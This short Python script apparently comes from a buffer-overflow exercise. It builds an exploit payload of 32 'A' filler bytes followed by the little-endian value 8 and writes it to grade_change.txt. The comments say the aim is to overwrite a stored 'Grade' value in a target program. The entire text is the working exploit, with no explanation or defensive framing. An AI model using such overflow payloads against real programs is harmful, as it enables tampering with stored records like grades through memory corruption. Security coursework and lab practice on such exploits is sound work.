# Exploit payload to change Grade to 8
payload = b"A" * 32  # Filler to reach Grade
payload += b"\x08\x00\x00\x00"  # New Grade value (8 in little-endian)

# Save to a file
with open("./grade_change.txt", "wb") as f:
    f.write(payload)
